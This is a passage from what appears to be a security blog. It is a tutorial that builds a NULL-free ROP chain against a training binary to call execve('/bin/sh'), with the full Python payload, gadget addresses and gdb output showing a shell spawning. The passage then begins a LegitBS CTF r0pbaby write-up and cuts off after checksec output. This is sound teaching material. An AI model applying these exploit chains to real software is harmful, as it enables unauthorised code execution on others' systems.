<p><code>system()</code> is not linked in this binary! There is, however, one <code>int 0x80; ret</code> gadget available, which we can use to build a ROP chain. During the workshop in London I showed the <code>mprotect</code> and <code>read</code> strategy. Now, I&rsquo;d like to show how to do an <code>execve</code> syscall using the ROP chain. For added fun, I&rsquo;ll assume that NULL bytes are badchars.</p>

<p>First, however, upload the binary to <a href="http://ropshell.com">ropshell.com</a> or use Your-Favorite-ROP-Gadget-Dumper.</p>

<p>One thing that is <em>absolutely</em> mandatory is access to a gadget that does a syscall. ropshell.com suggests <code>&gt; 0x08052cf0 : int 0x80; ret</code>. Sometimes, there might be another gadget where extra instructions are present between the <code>int</code> and the <code>ret</code>. This is usually fine and you can find them in ropshell.com by searching like this: <code>int 0x80 ?</code>. The extra <code>?</code> indicates that extra opcodes may be present.</p>

<p>Now that we have that all important gadget, we can start building the rest of the ROP chain. We&rsquo;ll need to set a couple of registers and build the argument for <code>execve</code> in memory.</p>

<p>For x86 syscalls, the arguments are passed in registers. <a href="http://syscalls.kernelgrok.com/">This website</a> contains a list of the syscalls and a short description of the arguments. For <code>execve</code>, we see this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">eax</span> <span class="o">=</span> syscall <span class="nv">number</span> <span class="o">=</span> 0x0b
</span><span class='line'><span class="nv">ebx</span> <span class="o">=</span> pointer to filename to execute
</span><span class='line'><span class="nv">ecx</span> <span class="o">=</span> pointer to argv
</span><span class='line'><span class="nv">edx</span> <span class="o">=</span> pointer to envp
</span></code></pre></td></tr></table></div></figure>


<p>However, I was unable to get the exploit to work when <code>ecx</code> was pointing to a string. Instead, I opted to set <code>ecx</code> and <code>edx</code> to NULL. Let&rsquo;s start building this ROP chain, starting from the PoC. We will need to write out the string <code>/bin/sh</code> somewhere in memory. For this, we need two things:</p>

<ol>
<li>A location to write the string</li>
<li>A gadget that allows us to write out the string</li>
</ol>


<p>For #1, we can look at the output of vmmap in gdb-peda:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>vmmap
</span><span class='line'>Start      End        Perm    Name
</span><span class='line'>0x08048000 0x080ca000 r-xp    /home/seb/tmp/level0
</span><span class='line'>0x080ca000 0x080cb000 rw-p    /home/seb/tmp/level0
</span><span class='line'>0x080cb000 0x080ef000 rw-p    <span class="o">[</span>heap<span class="o">]</span>
</span><span class='line'>0xb7fff000 0xb8000000 r-xp    <span class="o">[</span>vdso<span class="o">]</span>
</span><span class='line'>0xbffdf000 0xc0000000 rw-p    <span class="o">[</span>stack<span class="o">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>ASLR is disabled, but taking the heap or stack is not my favorite option. Instead, let&rsquo;s use <code>0x080ca000</code> to <code>0x080cb000</code>. This area is readable and writeable. Not executable but that doesn&rsquo;t matter, as we will not store shellcode there anyway.</p>

<p>For #2, ropshell.com has no good suggestions, as they are <code>add [r32], r32</code> instructions. If the memory contains values already, we&rsquo;ll not be able to write out the string reliably, unless the block of memory contains NULL bytes.</p>

<p>To avoid complications, I searched for <code>mov [?</code> in ropshell.com:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>ropshell&gt; search mov <span class="o">[</span>?
</span><span class='line'>found many, display max <span class="m">256</span> gadgets
</span><span class='line'>&gt; 0x0806bc2b : mov <span class="o">[</span>ecx<span class="o">]</span>, 0x83<span class="p">;</span> ret
</span><span class='line'>&gt; 0x08071e79 : mov <span class="o">[</span>ecx<span class="o">]</span>, 1<span class="p">;</span> ret
</span><span class='line'>&gt; 0x08079191 : mov <span class="o">[</span>edx<span class="o">]</span>, eax<span class="p">;</span> ret
</span><span class='line'>&gt; 0x080a82e8 : mov <span class="o">[</span>eax + 0x4c<span class="o">]</span>, edx<span class="p">;</span> ret
</span><span class='line'>&gt; 0x080a6544 : mov <span class="o">[</span>ecx + 0x1fc0<span class="o">]</span>, 4<span class="p">;</span> ret
</span><span class='line'>&gt; 0x08076839 : mov <span class="o">[</span>ecx + 0x83049a74<span class="o">]</span>, cl<span class="p">;</span> ret
</span><span class='line'>&gt; 0x08052fac : mov <span class="o">[</span>ecx<span class="o">]</span>, 1<span class="p">;</span> pop ebp<span class="p">;</span> ret 4
</span><span class='line'>&gt; 0x080499d2 : mov <span class="o">[</span>ecx<span class="o">]</span>, eax<span class="p">;</span> pop ebp<span class="p">;</span> ret
</span><span class='line'>&gt; 0x080526f6 : mov <span class="o">[</span>ecx<span class="o">]</span>, edx<span class="p">;</span> pop ebp<span class="p">;</span> ret
</span></code></pre></td></tr></table></div></figure>


<p>I like <code>0x08079191 : mov [edx], eax; ret</code> a lot. It&rsquo;s only uses two registers and contains no unnecessary instructions. Let&rsquo;s see how we can set <code>edx</code> and <code>eax</code> to what we need.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>ropshell&gt; search pop r32
</span><span class='line'>found <span class="m">15</span> gadgets
</span><span class='line'>&gt; 0x0806b893 : pop eax<span class="p">;</span> ret
</span><span class='line'>&gt; 0x080525ee : pop ebx<span class="p">;</span> ret
</span><span class='line'>&gt; 0x080525c6 : pop edx<span class="p">;</span> ret
</span><span class='line'>&gt; 0x0806a5c9 : pop esi<span class="p">;</span> ret
</span><span class='line'>&gt; 0x080516ad : pop edi<span class="p">;</span> ret
</span><span class='line'>&gt; 0x08048550 : pop ebp<span class="p">;</span> ret
</span><span class='line'>&gt; 0x08064630 : pop esp<span class="p">;</span> ret
</span><span class='line'>&gt; 0x080525ed : pop ecx<span class="p">;</span> pop ebx<span class="p">;</span> ret
</span></code></pre></td></tr></table></div></figure>


<p>Plenty of gadgets we can use. The plan is now to pop the address <code>0x080ca040</code> into <code>edx</code> and the value <code>/bin</code> into <code>eax</code>. The address is arbitrary, but chosen such that we don&rsquo;t overwrite anything important or that the address contains NULL bytes. Let&rsquo;s build the first PoC:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'>
</span><span class='line'><span class="c"># this is a helper function, which will take a 32-bit value and convert it to little-endian.</span>
</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'><span class="c"># start our payload as a string of character.</span>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="c"># add padding to overwrite upto the saved return address.</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x080525c6</span><span class="p">)</span>   <span class="c"># pop edx; ret</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x080ca040</span><span class="p">)</span>   <span class="c"># start writing here</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x0806b893</span><span class="p">)</span>   <span class="c"># pop eax; ret</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&#39;/bin&#39;</span>            <span class="c"># first part of /bin/sh</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x08079191</span><span class="p">)</span>   <span class="c"># mov [edx], eax; ret</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x080525c6</span><span class="p">)</span>   <span class="c"># pop edx; ret</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x080ca044</span><span class="p">)</span>   <span class="c"># just after the first piece of &#39;/bin&#39;</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x0806b893</span><span class="p">)</span>   <span class="c"># pop eax; ret</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&#39;/shX&#39;</span>            <span class="c"># we&#39;ll zero out the X in a moment</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x08079191</span><span class="p">)</span>   <span class="c"># mov [edx], eax; ret</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x08097bff</span><span class="p">)</span>   <span class="c"># xor eax, eax; ret (set eax to 0)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x080525c6</span><span class="p">)</span>   <span class="c"># pop edx; ret</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x080ca047</span><span class="p">)</span>   <span class="c"># zero out the X, making the string NULL terminated</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x08079191</span><span class="p">)</span>   <span class="c"># mov [edx], eax; ret</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;AAAA&quot;</span>          <span class="c"># crash</span>
</span><span class='line'><span class="k">print</span> <span class="n">payload</span>
</span></code></pre></td></tr></table></div></figure>


<p>Run it and expect the memory area:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">seb</span><span class="nd">@minol</span><span class="p">:</span><span class="o">~/</span><span class="n">tmp</span><span class="err">$</span> <span class="n">python</span> <span class="n">purepoc0</span><span class="o">.</span><span class="n">py</span> <span class="o">&gt;</span> <span class="n">input0</span>
</span><span class='line'><span class="n">seb</span><span class="nd">@minol</span><span class="p">:</span><span class="o">~/</span><span class="n">tmp</span><span class="err">$</span> <span class="n">gdb</span> <span class="o">-</span><span class="n">q</span> <span class="n">level0</span>
</span><span class='line'><span class="n">Reading</span> <span class="n">symbols</span> <span class="kn">from</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">seb</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">level0</span><span class="o">...</span><span class="p">(</span><span class="n">no</span> <span class="n">debugging</span> <span class="n">symbols</span> <span class="n">found</span><span class="p">)</span><span class="o">...</span><span class="n">done</span><span class="o">.</span>
</span><span class='line'><span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="err">$</span> <span class="n">r</span> <span class="o">&lt;</span> <span class="n">input0</span>
</span><span class='line'><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">ROP</span> <span class="n">tutorial</span> <span class="n">level0</span>
</span><span class='line'><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">What</span><span class="s">&#39;s your name? [+] Bet you can&#39;</span><span class="n">t</span> <span class="n">ROP</span> <span class="n">me</span><span class="p">,</span> <span class="n">AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK</span><span class="err">�@�</span>
</span><span class='line'>              <span class="err">��</span><span class="o">/</span><span class="nb">bin</span><span class="err">��</span><span class="n">D</span><span class="err">�</span>
</span><span class='line'>                       <span class="err">��</span><span class="o">/</span><span class="n">shX</span><span class="err">��</span><span class="p">{</span>       <span class="err">�</span><span class="n">G</span><span class="err">�</span>
</span><span class='line'>                                         <span class="err">�</span><span class="n">AAAA</span><span class="err">!</span>
</span><span class='line'>
</span><span class='line'><span class="n">Program</span> <span class="n">received</span> <span class="n">signal</span> <span class="n">SIGSEGV</span><span class="p">,</span> <span class="n">Segmentation</span> <span class="n">fault</span><span class="o">.</span>
</span><span class='line'><span class="p">[</span><span class="o">----------------------------------</span><span class="n">registers</span><span class="o">-----------------------------------</span><span class="p">]</span>
</span><span class='line'><span class="n">EAX</span><span class="p">:</span> <span class="mh">0x0</span>
</span><span class='line'><span class="n">EBX</span><span class="p">:</span> <span class="mh">0x0</span>
</span><span class='line'><span class="n">ECX</span><span class="p">:</span> <span class="mh">0xbffff5cc</span> <span class="o">--&gt;</span> <span class="mh">0x80ca720</span> <span class="o">--&gt;</span> <span class="mh">0xfbad2a84</span>
</span><span class='line'><span class="n">EDX</span><span class="p">:</span> <span class="mh">0x80ca047</span> <span class="o">--&gt;</span> <span class="mh">0x0</span>
</span><span class='line'><span class="n">ESI</span><span class="p">:</span> <span class="mh">0x80488e0</span> <span class="p">(</span><span class="o">&lt;</span><span class="n">__libc_csu_fini</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">push</span>   <span class="n">ebp</span><span class="p">)</span>
</span><span class='line'><span class="n">EDI</span><span class="p">:</span> <span class="mh">0x6f23fbda</span>
</span><span class='line'><span class="n">EBP</span><span class="p">:</span> <span class="mh">0x4b4b4b4b</span> <span class="p">(</span><span class="s">&#39;KKKK&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">ESP</span><span class="p">:</span> <span class="mh">0xbffff658</span> <span class="o">--&gt;</span> <span class="mh">0x0</span>
</span><span class='line'><span class="n">EIP</span><span class="p">:</span> <span class="mh">0x41414141</span> <span class="p">(</span><span class="s">&#39;AAAA&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">EFLAGS</span><span class="p">:</span> <span class="mh">0x210246</span> <span class="p">(</span><span class="n">carry</span> <span class="n">PARITY</span> <span class="n">adjust</span> <span class="n">ZERO</span> <span class="n">sign</span> <span class="n">trap</span> <span class="n">INTERRUPT</span> <span class="n">direction</span> <span class="n">overflow</span><span class="p">)</span>
</span><span class='line'><span class="p">[</span><span class="o">-------------------------------------</span><span class="n">code</span><span class="o">-------------------------------------</span><span class="p">]</span>
</span><span class='line'><span class="n">Invalid</span> <span class="err">$</span><span class="n">PC</span> <span class="n">address</span><span class="p">:</span> <span class="mh">0x41414141</span>
</span><span class='line'><span class="p">[</span><span class="o">------------------------------------</span><span class="n">stack</span><span class="o">-------------------------------------</span><span class="p">]</span>
</span><span class='line'><span class="mo">0000</span><span class="o">|</span> <span class="mh">0xbffff658</span> <span class="o">--&gt;</span> <span class="mh">0x0</span>
</span><span class='line'><span class="mo">0004</span><span class="o">|</span> <span class="mh">0xbffff65c</span> <span class="o">--&gt;</span> <span class="mh">0x0</span>
</span><span class='line'><span class="mo">000</span><span class="mi">8</span><span class="o">|</span> <span class="mh">0xbffff660</span> <span class="o">--&gt;</span> <span class="mh">0x0</span>
</span><span class='line'><span class="mo">0012</span><span class="o">|</span> <span class="mh">0xbffff664</span> <span class="o">--&gt;</span> <span class="mh">0x0</span>
</span><span class='line'><span class="mo">0016</span><span class="o">|</span> <span class="mh">0xbffff668</span> <span class="o">--&gt;</span> <span class="mh">0x0</span>
</span><span class='line'><span class="mo">0020</span><span class="o">|</span> <span class="mh">0xbffff66c</span> <span class="o">--&gt;</span> <span class="mh">0x6f23fbda</span>
</span><span class='line'><span class="mo">0024</span><span class="o">|</span> <span class="mh">0xbffff670</span> <span class="o">--&gt;</span> <span class="mh">0x0</span>
</span><span class='line'><span class="mo">002</span><span class="mi">8</span><span class="o">|</span> <span class="mh">0xbffff674</span> <span class="o">--&gt;</span> <span class="mh">0x0</span>
</span><span class='line'><span class="p">[</span><span class="o">------------------------------------------------------------------------------</span><span class="p">]</span>
</span><span class='line'><span class="n">Legend</span><span class="p">:</span> <span class="n">code</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">rodata</span><span class="p">,</span> <span class="n">value</span>
</span><span class='line'><span class="n">Stopped</span> <span class="n">reason</span><span class="p">:</span> <span class="n">SIGSEGV</span>
</span><span class='line'><span class="mh">0x41414141</span> <span class="ow">in</span> <span class="err">??</span> <span class="p">()</span>
</span><span class='line'><span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="err">$</span> <span class="n">x</span><span class="o">/</span><span class="n">s</span> <span class="mh">0x80ca040</span>
</span><span class='line'><span class="mh">0x80ca040</span><span class="p">:</span>  <span class="s">&quot;/bin/sh&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Excellent, that worked. Now we have to set the registers accordingly. <code>ebx</code> must be set to <code>0x80ca040</code>, <code>eax</code> must be set to <code>0x0b</code> and we&rsquo;ll zero out <code>ecx</code> and <code>edx</code>.</p>

<p>There are no gadgets that do <code>xor ecx, ecx; ret</code>. Instead, I opted to load <code>0xffffffff</code> into <code>ecx</code> and <code>edx</code> and then increase the registers by one; this will overflow and make both of them zero.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c"># building from the previous code</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x080525ed</span><span class="p">)</span>   <span class="c"># pop ecx; pop ebx; ret</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0xffffffff</span><span class="p">)</span>   <span class="c"># ecx -&gt; will be zeroed later</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x080ca040</span><span class="p">)</span>   <span class="c"># ebx, filename to execute &quot;/bin/sh&quot;</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x08083f36</span><span class="p">)</span>   <span class="c"># inc ecx; adc al, 0x39; ret</span>
</span><span class='line'>                          <span class="c"># this will clobber eax, but we&#39;ll set it later anyway. ecx will be zero</span>
</span><span class='line'>  
</span><span class='line'><span class="c"># do the same for edx                     </span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x080525c6</span><span class="p">)</span>   <span class="c"># pop edx; ret</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0xffffffff</span><span class="p">)</span>   <span class="c"># </span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x0804ef21</span><span class="p">)</span>   <span class="c"># inc edx; add al, 0x83; ret</span>
</span></code></pre></td></tr></table></div></figure>


<p>Our next problem arises: I don&rsquo;t want to use NULL bytes. However, we&rsquo;ll need to set <code>eax</code> to <code>0x0000000b</code>. I use the following sequence for this, making use of the <code>movzx</code> instruction. <code>movzx</code> is <em>move into register, zero extend</em>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c"># continue</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x0806b893</span><span class="p">)</span>   <span class="c"># pop eax; ret</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x4141410b</span><span class="p">)</span>   <span class="c"># value for eax, without NULL bytes</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x08071b90</span><span class="p">)</span>   <span class="c"># movzx eax, al; ret</span>
</span><span class='line'>                          <span class="c"># after this instruction, eax will be 0x0b</span>
</span><span class='line'>                          
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x08052cf0</span><span class="p">)</span>   <span class="c"># int 0x80; ret</span>
</span></code></pre></td></tr></table></div></figure>


<p>That&rsquo;s it. Let&rsquo;s try:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>seb@minol:~/tmp<span class="nv">$ </span>python purepoc0.py &gt; input0
</span><span class='line'>seb@minol:~/tmp<span class="nv">$ </span>gdb -q level0
</span><span class='line'>Reading symbols from /home/seb/tmp/level0...<span class="o">(</span>no debugging symbols found<span class="o">)</span>...done.
</span><span class='line'>gdb-peda<span class="nv">$ </span>r &lt; input0
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> ROP tutorial level0
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> What<span class="s1">&#39;s your name? [+] Bet you can&#39;</span>t ROP me, AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK...
</span><span class='line'>
</span><span class='line'>process <span class="m">3481</span> is executing new program: /bin/dash
</span><span class='line'><span class="o">[</span>Inferior <span class="m">1</span> <span class="o">(</span>process 3481<span class="o">)</span> exited normally<span class="o">]</span>
</span><span class='line'>Warning: not running or target is remote
</span><span class='line'>gdb-peda<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>Nice! It looks like the shell was spawned! A final test consists of running it on the command line. The extra <code>cat</code> is added to keep the spawned shell alive, by connecting stdin and stdout of the newly created shell.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>seb@minol:~/tmp<span class="nv">$ </span><span class="o">(</span>python purepoc0.py<span class="p">;</span> cat<span class="o">)</span> <span class="p">|</span> ./level0
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> ROP tutorial level0
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> What<span class="s1">&#39;s your name? [+] Bet you can&#39;</span>t ROP me, AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK...&lt;snipped&gt;
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>seb<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>seb<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>seb<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,25<span class="o">(</span>floppy<span class="o">)</span>,27<span class="o">(</span>sudo<span class="o">)</span>,29<span class="o">(</span>audio<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,44<span class="o">(</span>video<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,103<span class="o">(</span>fuse<span class="o">)</span>,104<span class="o">(</span>scanner<span class="o">)</span>,107<span class="o">(</span>bluetooth<span class="o">)</span>,108<span class="o">(</span>netdev<span class="o">)</span>,119<span class="o">(</span>kismet<span class="o">)</span>,900<span class="o">(</span>cbnetwork<span class="o">)</span>
</span><span class='line'>whoami
</span><span class='line'>seb
</span></code></pre></td></tr></table></div></figure>


<p>That was about it. The ROP chain is able to set all the required registers, write out a string in memory and finally perform a syscall.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[LegitBS CTF - R0pbaby]]></title>
    <link href="http://barrebas.github.io/blog/2015/05/29/legitbs-ctf-r0pbaby/"/>
    <updated>2015-05-29T23:07:23+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/05/29/legitbs-ctf-r0pbaby</id>
    <content type="html"><![CDATA[<p>I&rsquo;ve been away for quite a while, and I missed most of the LegitBS CTF. There were only a few hours left when I joined Swappage. Here&rsquo;s how we solved r0pbaby.</p>

<!--more-->


<p>So we&rsquo;re given a binary and a place to connect to. Upon running and examing the binary, it seems like this is a very easy ROP challenge. The binary will give libc function addresses upon request; this makes it easy to defeat ASLR. The option of getting libc&rsquo;s base address seems to return some strange address. Finally, the third option asks for a buffer, which is then copied to the stack, overwrites the saved return address and basically kicks off our ROP chain&hellip; couldn&rsquo;t be easier, right?</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/ropbaby<span class="nv">$ </span>file r0pbaby
</span><span class='line'>r0pbaby: ELF 64-bit LSB shared object, x86-64, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked <span class="o">(</span>uses shared libs<span class="o">)</span>, <span class="k">for</span> GNU/Linux 2.6.24, stripped
</span><span class='line'>bas@tritonal:~/tmp/ropbaby<span class="nv">$ </span>gdb ./r0pbaby
</span><span class='line'>gdb-peda<span class="nv">$ </span>checksec
</span><span class='line'>CANARY    : disabled
</span><span class='line'>FORTIFY   : ENABLED
</span><span class='line'>NX        : ENABLED
</span><span class='line'>PIE       : ENABLED
</span><span class='line'>RELRO     : disabled
</span></code></pre></td></tr></table></div></figure>


